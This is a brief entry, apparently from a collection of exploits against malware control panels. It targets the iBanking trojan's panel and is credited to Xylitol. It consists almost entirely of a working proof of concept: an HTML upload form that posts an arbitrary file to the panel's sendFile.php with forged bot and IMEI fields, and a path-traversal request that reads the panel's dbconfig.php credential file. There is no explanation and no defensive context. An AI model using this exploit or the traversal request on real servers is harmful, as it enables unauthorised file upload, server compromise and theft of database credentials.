#### iBanking


Type: Panel Upload Vulnerability

Author: [Xylitol](https://twitter.com/Xylit0l)
```
<!-- iBanking panel upload vulnerability -->
<!-- get.php?p=..&i=.&f=dbconfig.php -->
<form method="POST" action="http://localhost/smsbot/sendFile.php" enctype="multipart/form-data">
FiLEZ: <input type="file" name="uploadedfile" /><br />
<input type="hidden" name="bot_id" value="500" />
<input type="hidden" name="imei" value="000000000000000" />
<input type="submit" value="Pwn" />
</form>
```
